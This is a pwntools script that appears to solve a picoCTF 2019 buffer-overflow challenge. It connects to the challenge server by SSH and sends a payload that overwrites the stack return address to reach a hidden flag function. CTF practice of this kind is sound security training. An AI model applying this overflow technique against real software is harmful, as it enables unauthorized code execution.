from os import environ
from pwn import *

PATH = "/problems/newoverflow-2_0_b7d9b3bbdbb843a28a13ff1aa57410df"
EXEC = "vuln"

flag_call_adr = 0x0040084D
main_call_adr = 0x004008CE

send = (0x40 + 8) * b"x" + p64(main_call_adr) + p64(flag_call_adr)
s = ssh(
    host="2019shell1.picoctf.com",
    user=environ["PICOUSER"],
    password=environ["PICOPSWD"],
)

sh = s.process(EXEC, cwd=PATH)

sh.sendlineafter(" Can you match these numbers?", send)
sh.sendline(b" ")
sh.interactive()
# x = sh.recvrepeat()

# print(x.decode(errors='ignore'))

s.close()
